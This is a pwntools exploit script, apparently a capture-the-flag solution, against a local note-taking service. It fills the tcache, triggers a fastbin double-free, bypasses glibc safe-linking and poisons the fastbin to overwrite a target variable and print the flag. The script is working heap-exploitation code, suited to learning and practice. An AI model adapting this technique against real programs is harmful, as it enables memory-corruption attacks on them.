from pwn import *

p = remote('127.0.0.1', 1337)

def create_note(size, note):
    p.recvuntil(b'>> ')
    p.sendline(b'1')
    p.recvuntil(b'>> ')
    p.sendline(str(size).encode())
    p.recvuntil(b'>> ')
    p.sendline(note)
    p.recvuntil(b'Address -> ')
    addr = p.recvline()[:-1]
    return int(addr, 16)

def delete_note(idx):
    p.recvuntil(b'>> ')
    p.sendline(b'3')
    p.recvuntil(b'>> ')
    p.sendline(str(idx).encode())

def get_target_addr():
    p.recvuntil(b'>> ')
    p.sendline(b'4')
    p.recvuntil(b'Checking if ')
    addr = p.recvuntil(b"'s")[:-3]
    return int(addr, 16)

def print_flag():
    p.recvuntil(b'>> ')
    p.sendline(b'4')
    print(p.recvuntil(b'>> ').decode())

# fill up tcache, so any other malloc/free will be done on fastbin
for i in range(7):
    create_note(10, b'test')

for i in range(7):
    delete_note(i)
#======================

# Get target address
target_addr = get_target_addr()
print(f"Target variable is {hex(target_addr)}")

# Trigger double-free to have cylic list in fastbin
fbin_ptr = create_note(10, b'test')
create_note(10, b'test')
create_note(10, b'test')

delete_note(7)
delete_note(8)
delete_note(7)

# here we are setting new malloced chunk to (fbin_ptr >> 12) ^ target_addr
# this is the target_addr but protected because of safe linking mechanism
print(f"fastbin pointer is {hex(fbin_ptr)}")
protected_addr = (fbin_ptr >> 12) ^ target_addr
print(f"protected address is {hex(protected_addr)}")
fbin_ptr2 = create_note(10, p64(protected_addr))
assert(fbin_ptr == fbin_ptr2)
print("fastbin is poisoned")

# allocate 2 notes to set fake chunk to head
create_note(10, b'test')
create_note(10, b'test')

# now the next allocation will point to our stack variable
print("creating vulnerable note")
create_note(10, p64(0x1337))
print("vulnerable note created")

print_flag()
